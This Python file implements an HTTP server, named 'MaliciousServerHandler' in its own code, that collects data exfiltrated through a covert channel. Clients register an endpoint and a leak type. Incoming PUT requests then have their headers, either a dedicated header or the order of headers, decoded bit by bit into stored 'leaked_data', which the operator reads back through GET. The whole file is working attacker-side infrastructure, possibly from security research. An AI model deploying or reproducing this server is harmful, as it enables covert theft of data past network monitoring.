import json
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse

from modules.dedicated_header import DedicatedHeaderExtractor
from modules.headers_order import HeadersOrderExtractor

#Server state memory
configs = {}
leaked_data = {}
bit_buffers = {}

EXTRACTORS = {
    "dedicatedheader": DedicatedHeaderExtractor(),
    "headersorder": HeadersOrderExtractor()
}

class MaliciousServerHandler(BaseHTTPRequestHandler):
    
    def do_POST(self):
        parsed_path = urlparse(self.path)
        
        if parsed_path.path == '/setup':
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data.decode('utf-8'))

            entrypoint = "/" + data.get('entrypoint', '').lstrip('/')
            leak_type = data.get('type', '')

            if leak_type not in EXTRACTORS:
                self.send_response(400)
                self.end_headers()
                return

            configs[entrypoint] = leak_type
            leaked_data[entrypoint] = ""
            bit_buffers[entrypoint] = ""

            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(b'{"status": "setup complete"}')
        else:
            self.send_response(404)
            self.end_headers()

    def do_GET(self):
        parsed_path = urlparse(self.path)
        entrypoint = parsed_path.path

        if entrypoint in configs and entrypoint in leaked_data:
            self.send_response(200)
            self.send_header('Content-Type', 'text/plain')
            self.end_headers()
            self.wfile.write(leaked_data[entrypoint].encode('utf-8'))
        else:
            self.send_response(404)
            self.end_headers()

    def do_PUT(self):
        parsed_path = urlparse(self.path)
        entrypoint = parsed_path.path

        if entrypoint not in configs:
            self.send_response(404)
            self.end_headers()
            return

        leak_type = configs[entrypoint]
        extractor = EXTRACTORS.get(leak_type)
        
        if extractor:
            extractor.extract(self.headers, entrypoint, leaked_data, bit_buffers)
            
        self.send_response(200)
        self.end_headers()
    
    def do_DELETE(self):
        parsed_path = urlparse(self.path)
        
        if parsed_path.path == '/clear':
            # Svuota i dizionari in memoria
            configs.clear()
            leaked_data.clear()
            bit_buffers.clear()
            
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(b'{"status": "cache cleared"}')
        else:
            self.send_response(404)
            self.end_headers()

def run(server_class=HTTPServer, handler_class=MaliciousServerHandler, port=8001):
    server_address = ('0.0.0.0', port)
    httpd = server_class(server_address, handler_class)
    print(f"[*] Malicious Server listening on port {port}...")
    httpd.serve_forever()

if __name__ == '__main__':
    run()